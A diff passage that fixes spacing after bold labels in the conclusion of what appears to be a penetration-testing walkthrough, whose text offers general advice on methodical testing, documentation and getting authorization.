+- **PTES (Penetration Testing Execution Standard):** Methodology framework
 
-- **Cloud Security Alliance:**Cloud-specific security guidance
+- **Cloud Security Alliance:** Cloud-specific security guidance
 
 ## Conclusion: The Power of Methodical Testing
 
 This penetration test demonstrates that successful security assessments don’t always require sophisticated exploits or zero-day vulnerabilities. Often, they result from:
 
-- **Thorough reconnaissance:**Understanding the target completely
+- **Thorough reconnaissance:** Understanding the target completely
 
-- **Methodical testing:**Following a structured approach
+- **Methodical testing:** Following a structured approach
 
-- **Following leads:**When you find something interesting, investigate it
+- **Following leads:** When you find something interesting, investigate it
 
-- **Comprehensive documentation:**Recording everything for analysis and reporting
+- **Comprehensive documentation:** Recording everything for analysis and reporting
 
-**The Key Insight:**The most critical vulnerability wasn’t a complex exploit — it was simple information disclosure that revealed an entire attack surface.
+**The Key Insight:** The most critical vulnerability wasn’t a complex exploit — it was simple information disclosure that revealed an entire attack surface.
 
-**For Security Professionals:**This walkthrough shows the importance of:
+**For Security Professionals:** This walkthrough shows the importance of:
 
 - Systematic methodology
 
@@ -1414,7 +945,7 @@ This penetration test demonstrates that successful security assessments don’t 
 
 - Comprehensive testing
 
-**For Developers:**This demonstrates why:
+**For Developers:** This demonstrates why:
 
 - Input validation is critical
 
@@ -1424,7 +955,7 @@ This penetration test demonstrates that successful security assessments don’t 
 
 - Defense in depth is essential
 
-**For Organizations:**This highlights the need for:
+**For Organizations:** This highlights the need for:
 
 - Regular security assessments
 
@@ -1438,16 +969,16 @@ This penetration test demonstrates that successful security assessments don’t 
 
 Penetration testing is both an art and a science. It requires:
 
-- **Technical skills:**Understanding tools and techniques
+- **Technical skills:** Understanding tools and techniques
 
-- **Analytical thinking:**Connecting findings and following leads
+- **Analytical thinking:** Connecting findings and following leads
 
-- **Persistence:**Not giving up when initial tests fail
+- **Persistence:** Not giving up when initial tests fail
 
-- **Documentation:**Recording everything for analysis
+- **Documentation:** Recording everything for analysis
 
 Whether you’re conducting your first penetration test or your hundredth, remember: methodical, thorough testing will always yield better results than rushing to exploitation.
 
-**Remember:**Always ensure you have proper authorization before testing any system. Unauthorized access is illegal and unethical.
+**Remember:** Always ensure you have proper authorization before testing any system. Unauthorized access is illegal and unethical.
 
 **Happy (and ethical) hacking!**
